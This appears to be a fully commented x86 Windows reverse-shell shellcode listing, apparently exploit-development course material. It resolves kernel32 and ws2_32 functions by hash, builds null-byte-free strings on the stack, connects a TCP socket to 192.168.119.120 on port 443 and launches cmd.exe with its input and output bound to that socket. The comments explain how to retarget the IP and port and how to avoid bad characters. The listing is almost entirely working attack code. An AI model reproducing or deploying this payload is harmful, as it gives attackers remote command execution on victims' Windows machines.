start:
    int3                            ; DEBUG: Software breakpoint for WinDbg. REMOVE before use.

    ; Set up a fake stack frame. EBP will serve as our base pointer for storing
    ; resolved function addresses. We use EBP+offset as a stable scratch space
    ; throughout the shellcode so registers can be freely reused.
    mov  ebp, esp                   ; EBP = current stack top (our scratch base)

    ; Carve out stack space. 0xfffff9f0 is a large negative value chosen to:
    ;   1. Move ESP well below EBP so pushes don't overwrite our saved addresses
    ;   2. Avoid encoding a null byte (0x00) in the immediate operand
    ; To adjust for bad characters, change this value while keeping it negative.
    add  esp, 0xfffff9f0            ; ESP -= 0x610 (avoids null bytes in encoding)

; -----------------------------------------------------------------------
; FIND KERNEL32.DLL BASE ADDRESS
; Walk the PEB module list to find kernel32.dll without calling any API.
; On 32-bit Windows, FS always points to the Thread Environment Block (TEB).
; TEB+0x30 points to the Process Environment Block (PEB).
; PEB+0x0c points to PEB_LDR_DATA, and PEB_LDR_DATA+0x1c is the
; InInitializationOrderModuleList -- a doubly-linked list of loaded modules.
; The third entry in this list is always kernel32.dll.
; -----------------------------------------------------------------------
find_kernel32:
    xor  ecx, ecx                   ; ECX = 0 (used as null comparator below, avoids encoding 0x00)
    mov  esi, fs:[ecx+0x30]         ; ESI = PEB (FS segment base + 0x30; ECX=0 avoids null byte)
    mov  esi, [esi+0x0C]            ; ESI = PEB->Ldr (pointer to loader data)
    mov  esi, [esi+0x1C]            ; ESI = PEB->Ldr.InInitOrder (first list entry)

next_module:
    mov  ebx, [esi+0x08]            ; EBX = InInitOrder[x].DllBase (module base address)

    ; The module name is a UNICODE_STRING struct: { Length, MaxLength, Buffer }
    ; Length and MaxLength are each 2 bytes, so Buffer starts at offset +4.
    ; The list entry's FullDllName field is at +0x1c, but the Buffer pointer
    ; within that struct is at +0x20 (skipping the two USHORT length fields).
    mov  edi, [esi+0x20]            ; EDI = pointer to unicode module name buffer

    mov  esi, [esi]                 ; ESI = InInitOrder[x].Flink (advance to next entry)

    ; kernel32.dll is 12 characters long (indices 0-11). Check that character
    ; at index 12 is null (end of string) to identify it. Unicode, so *2.
    cmp  [edi+12*2], cx             ; modulename[12] == 0x0000 (unicode null)?
    jne  next_module                ; No: keep walking the list

; -----------------------------------------------------------------------
; STORE find_function ADDRESS USING JMP/CALL/POP
; We need find_function's runtime address in a register without using a
; hardcoded address (which may contain null bytes and is not position-independent).
; Trick: a CALL pushes the address of the next instruction as the return address.
; By arranging the CALL to land one instruction before find_function, we get
; find_function's address on the stack and can POP it into a register.
;
; Flow:
;   1. jmp  find_function_shorten_bnc  -> jumps forward over find_function_ret
;   2. call find_function_ret          -> pushes address of find_function, jumps back
;   3. find_function_ret: pop esi      -> ESI = address of find_function
; -----------------------------------------------------------------------
find_function_shorten:
    jmp  find_function_shorten_bnc  ; Jump forward (short) to the CALL instruction

find_function_ret:
    ; Execution arrives here via the CALL below. The return address on the stack
    ; is the address of find_function (the instruction immediately after the CALL).
    pop  esi                        ; ESI = address of find_function
    mov  [ebp+0x04], esi            ; Save find_function address at EBP+0x04 for later calls
    jmp  resolve_symbols_kernel32   ; Proceed to resolve API hashes

find_function_shorten_bnc:
    call  find_function_ret         ; CALL backwards: pushes &find_function, jumps to find_function_ret

; -----------------------------------------------------------------------
; find_function
; Locate a function in an arbitrary DLL by its ROR-13 hash.
; Caller must set:
;   EBX = DLL base address
;   [ESP+0x24] = target function hash (pushed before calling via EBP+0x04)
; Returns:
;   EAX = function virtual address
; Uses the PE export table: IMAGE_EXPORT_DIRECTORY contains three parallel arrays:
;   AddressOfNames[i]    -> function name string RVA
;   AddressOfNameOrdinals[i] -> ordinal index into AddressOfFunctions
;   AddressOfFunctions[ordinal] -> function RVA
; -----------------------------------------------------------------------
find_function:
    pushad                          ; Save all registers (EAX restored via [esp+0x1c] trick)

    ; The DOS header at DllBase+0x3c holds the offset to the PE signature.
    ; The PE optional header at PE+0x78 holds the Export Directory RVA.
    mov   eax, [ebx+0x3c]          ; EAX = offset to PE signature (e_lfanew)
    mov   edi, [ebx+eax+0x78]      ; EDI = Export Directory RVA (relative to DllBase)
    add   edi, ebx                  ; EDI = Export Directory VMA (absolute address)

    mov   ecx, [edi+0x18]           ; ECX = NumberOfNames (loop counter)
    mov   eax, [edi+0x20]           ; EAX = AddressOfNames RVA
    add   eax, ebx                  ; EAX = AddressOfNames VMA
    mov   [ebp-4], eax              ; Stash AddressOfNames VMA on stack for the loop

find_function_loop:
    ; Iterate backwards through the names array (ECX counts down to 0).
    jecxz find_function_finished    ; If ECX == 0, no match found -- give up
    dec   ecx                       ; Decrement counter (also keeps correct ordinal index)
    mov   eax, [ebp-4]              ; Reload AddressOfNames VMA
    mov   esi, [eax+ecx*4]          ; ESI = current name RVA (4 bytes per pointer)
    add   esi, ebx                  ; ESI = current name VMA (absolute address of string)

; -----------------------------------------------------------------------
; compute_hash  (ROR-13 variant)
; Hash the null-terminated ASCII function name pointed to by ESI.
; Algorithm: for each byte b: hash = ROR(hash, 13) + b
; Result lands in EDX.
; -----------------------------------------------------------------------
compute_hash:
    xor   eax, eax                  ; EAX = 0 (current character accumulator)
    cdq                             ; EDX = 0 (sign-extend EAX=0; sets hash accumulator to 0)
    cld                             ; Clear direction flag so LODSB increments ESI

compute_hash_again:
    lodsb                           ; AL = *ESI++  (load next character, advance pointer)
    test  al, al                    ; Set ZF if AL == 0 (null terminator check)
    jz    compute_hash_finished     ; ZF set: end of string, hash complete
    ror   edx, 0x0d                 ; Rotate current hash right by 13 bits
    add   edx, eax                  ; Mix in the new character byte
    jmp   compute_hash_again        ; Process next character

compute_hash_finished:

find_function_compare:
    ; The caller pushed the target hash before calling find_function via EBP+0x04.
    ; PUSHAD saved 8 registers (32 bytes = 0x20). The hash was pushed before that,
    ; so it sits at ESP+0x20+4 = ESP+0x24.
    cmp   edx, [esp+0x24]           ; Computed hash == target hash?
    jnz   find_function_loop        ; No match: try the next name

    ; Match found. Resolve the function address via the ordinal tables.
    ; AddressOfNameOrdinals maps the name index to an ordinal.
    ; AddressOfFunctions[ordinal] gives the function RVA.
    mov   edx, [edi+0x24]           ; EDX = AddressOfNameOrdinals RVA
    add   edx, ebx                  ; EDX = AddressOfNameOrdinals VMA
    mov   cx,  [edx+2*ecx]          ; CX  = ordinal for matched name (2 bytes per entry)
    mov   edx, [edi+0x1c]           ; EDX = AddressOfFunctions RVA
    add   edx, ebx                  ; EDX = AddressOfFunctions VMA
    mov   eax, [edx+4*ecx]          ; EAX = function RVA (4 bytes per entry)
    add   eax, ebx                  ; EAX = function VMA (absolute address)

    ; PUSHAD put the saved EAX at ESP+0x1c. Overwriting it here means POPAD
    ; will restore EAX to our resolved function address -- clean return value.
    mov   [esp+0x1c], eax           ; Patch saved EAX so POPAD returns it in EAX

find_function_finished:
    popad                           ; Restore all registers (EAX = function address if matched)
    ret                             ; Return to caller (pops the hash argument too via stdcall? No -- caller cleans)

; -----------------------------------------------------------------------
; RESOLVE SYMBOLS FROM KERNEL32.DLL
; EBX still holds the kernel32.dll base from find_kernel32.
; We push each function's pre-computed ROR-13 hash, call find_function,
; and save the returned address into our EBP scratch space.
;
; EBP scratch layout (grows as we resolve more functions):
;   [EBP+0x04] = find_function address
;   [EBP+0x10] = TerminateProcess
;   [EBP+0x14] = LoadLibraryA
;   [EBP+0x18] = CreateProcessA
;   [EBP+0x1c] = WSAStartup      (resolved later after loading ws2_32)
;   [EBP+0x20] = WSASocketA
;   [EBP+0x24] = WSAConnect
; -----------------------------------------------------------------------
resolve_symbols_kernel32:
    push  0x78b5b983                ; Hash of "TerminateProcess"
    call dword ptr [ebp+0x04]       ; find_function(kernel32, hash) -> EAX
    mov   [ebp+0x10], eax           ; [EBP+0x10] = TerminateProcess

    push  0xec0e4e8e                ; Hash of "LoadLibraryA"
    call dword ptr [ebp+0x04]       ; find_function -> EAX
    mov   [ebp+0x14], eax           ; [EBP+0x14] = LoadLibraryA

    push  0x16b3fe72                ; Hash of "CreateProcessA"
    call dword ptr [ebp+0x04]       ; find_function -> EAX
    mov   [ebp+0x18], eax           ; [EBP+0x18] = CreateProcessA

; -----------------------------------------------------------------------
; LOAD ws2_32.dll
; Build the string "ws2_32.dll" on the stack without embedding it as a
; literal (which could introduce bad characters or a visible string).
; Strings are pushed in reverse dword chunks, right-to-left.
;
; Memory layout on stack (low -> high address after pushes):
;   "ws2_" | "32.d" | "ll\0\0"
; = "ws2_32.dll\0"
;
; To avoid a null byte in the immediate: load 0x6c6c into AX while EAX=0,
; giving 0x00006c6c. When pushed, the upper null bytes act as the terminator.
; -----------------------------------------------------------------------
load_ws2_32:
    xor   eax, eax                  ; EAX = 0x00000000 (upper bytes become null terminator)
    mov   ax, 0x6c6c                ; AX  = 0x6c6c ("ll"); EAX = 0x00006c6c
    push  eax                       ; Push 0x00006c6c -> "ll\0\0" on stack
    push  0x642e3233                ; Push "32.d" (little-endian: 33 32 2e 64)
    push  0x5f327377                ; Push "ws2_" (little-endian: 77 73 32 5f)
    push  esp                       ; Push pointer to "ws2_32.dll" string
    call dword ptr [ebp+0x14]       ; LoadLibraryA("ws2_32.dll") -> EAX = module base

; -----------------------------------------------------------------------
; RESOLVE SYMBOLS FROM ws2_32.dll
; EAX = ws2_32.dll base from LoadLibraryA. Move it to EBX so find_function
; can use it (find_function expects DLL base in EBX).
; -----------------------------------------------------------------------
resolve_symbols_ws2_32:
    mov   ebx, eax                  ; EBX = ws2_32.dll base address

    push  0x3bfcedcb                ; Hash of "WSAStartup"
    call dword ptr [ebp+0x04]       ; find_function(ws2_32, hash) -> EAX
    mov   [ebp+0x1C], eax           ; [EBP+0x1c] = WSAStartup

    push  0xadf509d9                ; Hash of "WSASocketA"
    call dword ptr [ebp+0x04]       ; find_function -> EAX
    mov   [ebp+0x20], eax           ; [EBP+0x20] = WSASocketA

    push  0xb32dba0c                ; Hash of "WSAConnect"
    call dword ptr [ebp+0x04]       ; find_function -> EAX
    mov   [ebp+0x24], eax           ; [EBP+0x24] = WSAConnect

; -----------------------------------------------------------------------
; CALL WSAStartup(wVersionRequired=0x0202, lpWSAData)
; Prototype: int WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData);
; wVersionRequired = 0x0202 requests Winsock version 2.2.
; lpWSAData points to a WSADATA struct (~400 bytes). We subtract 0x590 from
; the current ESP to place it safely below our scratch area.
; -----------------------------------------------------------------------
call_wsastartup:
    mov   eax, esp                  ; EAX = current ESP
    mov   cx, 0x590                 ; CX  = 0x590 (offset large enough for WSADATA)
    sub   eax, ecx                  ; EAX = address of WSADATA buffer (below stack)
    push  eax                       ; arg2: lpWSAData
    xor   eax, eax                  ; EAX = 0
    mov   ax, 0x0202                ; AX  = 0x0202 (Winsock 2.2); avoids null bytes
    push  eax                       ; arg1: wVersionRequired = 2.2
    call dword ptr [ebp+0x1C]       ; WSAStartup(2.2, &wsadata)

; -----------------------------------------------------------------------
; CALL WSASocketA(af, type, protocol, lpProtocolInfo, g, dwFlags)
; Prototype: SOCKET WSASocketA(int af, int type, int protocol,
;                              LPWSAPROTOCOL_INFOA lpProtocolInfo,
;                              GROUP g, DWORD dwFlags);
; af=AF_INET(2), type=SOCK_STREAM(1), protocol=IPPROTO_TCP(6)
; All other args = 0. Arithmetic avoids null-byte immediates.
; -----------------------------------------------------------------------
call_wsasocketa:
    xor   eax, eax                  ; EAX = 0
    push  eax                       ; arg6: dwFlags = 0
    push  eax                       ; arg5: g = 0
    push  eax                       ; arg4: lpProtocolInfo = NULL
    mov   al, 0x06                  ; AL = 6 (IPPROTO_TCP)
    push  eax                       ; arg3: protocol = IPPROTO_TCP (6)
    sub   al, 0x05                  ; AL = 1 (SOCK_STREAM); avoids pushing literal 1
    push  eax                       ; arg2: type = SOCK_STREAM (1)
    inc   eax                       ; EAX = 2 (AF_INET); avoids pushing literal 2
    push  eax                       ; arg1: af = AF_INET (2)
    call dword ptr [ebp+0x20]       ; WSASocketA -> EAX = socket descriptor

; -----------------------------------------------------------------------
; CALL WSAConnect(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)
; Prototype: int WSAConnect(SOCKET s, const struct sockaddr *name, int namelen,
;                           LPWSABUF lpCallerData, LPWSABUF lpCalleeData,
;                           LPQOS lpSQOS, LPQOS lpGQOS);
;
; Build a sockaddr_in on the stack:
;   struct sockaddr_in {
;       short  sin_family;   // AF_INET = 2
;       u_short sin_port;    // port in network byte order (big-endian)
;       in_addr sin_addr;    // IP in network byte order
;       char sin_zero[8];    // padding
;   }
;
; Port 443 = 0x01bb. Network byte order = 0xbb01 stored as little-endian WORD.
; IP 192.168.119.120 = 0xc0a87778. Little-endian DWORD = push 0x7877a8c0.
;   To change port: recalculate as big-endian hex, e.g. port 4444 = 0x115c -> push 0x5c11
;   To change IP:   reverse each octet, e.g. 10.10.10.1 -> push 0x010a0a0a
; -----------------------------------------------------------------------
call_wsaconnect:
    mov   esi, eax                  ; ESI = socket descriptor (preserve across pushes)
    xor   eax, eax                  ; EAX = 0
    push  eax                       ; sin_zero[4-7] = 0 (padding)
    push  eax                       ; sin_zero[0-3] = 0 (padding)
    push  0x7877a8c0                ; sin_addr = 192.168.119.120 (little-endian)
    mov   ax, 0xbb01                ; AX = 0xbb01 = port 443 in network byte order
    shl   eax, 0x10                 ; Shift port into upper word: EAX = 0xbb010000
    add   ax, 0x02                  ; Add AF_INET=2 in lower word: EAX = 0xbb010002
    push  eax                       ; Push { sin_port=443, sin_family=AF_INET }
    push  esp                       ; Push pointer to sockaddr_in struct
    pop   edi                       ; EDI = pointer to sockaddr_in (saved before more pushes)
    xor   eax, eax                  ; EAX = 0
    push  eax                       ; arg7: lpGQOS = NULL
    push  eax                       ; arg6: lpSQOS = NULL
    push  eax                       ; arg5: lpCalleeData = NULL
    push  eax                       ; arg4: lpCallerData = NULL
    add   al, 0x10                  ; AL = 16 = sizeof(sockaddr_in); avoids null byte
    push  eax                       ; arg3: namelen = 16
    push  edi                       ; arg2: name = &sockaddr_in
    push  esi                       ; arg1: s = socket descriptor
    call dword ptr [ebp+0x24]       ; WSAConnect(s, &sockaddr_in, 16, ...)

; -----------------------------------------------------------------------
; BUILD STARTUPINFOA ON THE STACK
; CreateProcessA needs a pointer to a STARTUPINFOA struct. We build it directly
; on the stack by pushing fields in reverse order (last field first).
;
; Key fields we care about:
;   cb           = sizeof(STARTUPINFOA) = 0x44 (68 bytes)
;   dwFlags      = STARTF_USESTDHANDLES (0x100) -- tells CreateProcess to use
;                  our hStd* handles instead of the default console handles
;   hStdInput    = ESI (socket) -- stdin reads from our socket
;   hStdOutput   = ESI (socket) -- stdout writes to our socket
;   hStdError    = ESI (socket) -- stderr writes to our socket
;
; By setting all three std handles to the connected socket, cmd.exe I/O is
; fully redirected over the network connection.
;
; 0x100 is built as 0x80 + 0x80 to avoid a null byte in the immediate.
; -----------------------------------------------------------------------
create_startupinfoa:
    push  esi                       ; hStdError  = socket
    push  esi                       ; hStdOutput = socket
    push  esi                       ; hStdInput  = socket
    xor   eax, eax                  ; EAX = 0
    push  eax                       ; lpReserved2 = NULL
    push  eax                       ; cbReserved2 = 0, wShowWindow = 0
    mov   al, 0x80                  ; AL = 0x80
    xor   ecx, ecx                  ; ECX = 0
    mov   cx, 0x80                  ; CX  = 0x80
    add   eax, ecx                  ; EAX = 0x100 = STARTF_USESTDHANDLES
    push  eax                       ; dwFlags = STARTF_USESTDHANDLES (0x100)
    xor   eax, eax                  ; EAX = 0
    push  eax                       ; dwFillAttribute = 0
    push  eax                       ; dwYCountChars = 0
    push  eax                       ; dwXCountChars = 0
    push  eax                       ; dwYSize = 0
    push  eax                       ; dwXSize = 0
    push  eax                       ; dwY = 0
    push  eax                       ; dwX = 0
    push  eax                       ; lpTitle = NULL
    push  eax                       ; lpDesktop = NULL
    push  eax                       ; lpReserved = NULL
    mov   al, 0x44                  ; AL = 0x44 = 68 = sizeof(STARTUPINFOA)
    push  eax                       ; cb = 68
    push  esp                       ; Push pointer to the STARTUPINFOA we just built
    pop   edi                       ; EDI = &STARTUPINFOA (saved before more pushes)

; -----------------------------------------------------------------------
; BUILD "cmd.exe" STRING ON THE STACK
; We cannot push "cmd.exe\0" directly because it would embed 0x65786500
; which ends with a null byte (bad character in most exploits).
; Instead, push the bitwise negation and use NEG to produce the value:
;   NEG(0xff9a879b) = 0x00657865 = "exe\0" (little-endian: 65 78 65 00)
; The leading null byte becomes the string terminator -- it is at the HIGH
; address (most significant byte) and ends up in memory AFTER the string,
; which is where we need it in little-endian layout.
; Combined with "cmd." = 0x2e646d63, the full stack string is:
;   [63 6d 64 2e] [65 78 65 00] = "cmd.exe\0"
; -----------------------------------------------------------------------
create_cmd_string:
    mov   eax, 0xff9a879b           ; EAX = ~"exe\0" (bitwise complement)
    neg   eax                       ; EAX = 0x00657865 = "exe\0" (avoids null in immediate)
    push  eax                       ; Push "exe\0" (null terminator embedded in high byte)
    push  0x2e646d63                ; Push "cmd." (little-endian: 63 6d 64 2e)
    push  esp                       ; Push pointer to "cmd.exe" string
    pop   ebx                       ; EBX = &"cmd.exe"

; -----------------------------------------------------------------------
; CALL CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes,
;                     lpThreadAttributes, bInheritHandles, dwCreationFlags,
;                     lpEnvironment, lpCurrentDirectory, lpStartupInfo,
;                     lpProcessInformation)
;
; lpProcessInformation points to a PROCESS_INFORMATION struct (16 bytes).
; We subtract 0x390 from ESP to allocate space below the stack for it,
; preventing it from being overwritten by the function's own stack usage.
;
; bInheritHandles = TRUE (1) is CRITICAL: without it the child process will
; not inherit our socket handle and the reverse shell will not work.
; -----------------------------------------------------------------------
call_createprocessa:
    mov   eax, esp                  ; EAX = current ESP
    xor   ecx, ecx                  ; ECX = 0
    mov   cx, 0x390                 ; CX  = 0x390 (space for PROCESS_INFORMATION + margin)
    sub   eax, ecx                  ; EAX = address of PROCESS_INFORMATION buffer
    push  eax                       ; arg10: lpProcessInformation
    push  edi                       ; arg9:  lpStartupInfo = &STARTUPINFOA
    xor   eax, eax                  ; EAX = 0
    push  eax                       ; arg8:  lpCurrentDirectory = NULL (inherit from parent)
    push  eax                       ; arg7:  lpEnvironment = NULL (inherit from parent)
    push  eax                       ; arg6:  dwCreationFlags = 0
    inc   eax                       ; EAX = 1 = TRUE
    push  eax                       ; arg5:  bInheritHandles = TRUE (socket handle must be inherited)
    dec   eax                       ; EAX = 0 = NULL
    push  eax                       ; arg4:  lpThreadAttributes = NULL
    push  eax                       ; arg3:  lpProcessAttributes = NULL
    push  ebx                       ; arg2:  lpCommandLine = "cmd.exe"
    push  eax                       ; arg1:  lpApplicationName = NULL (resolved from lpCommandLine)
    call dword ptr [ebp+0x18]       ; CreateProcessA -> spawns cmd.exe with I/O on our socket
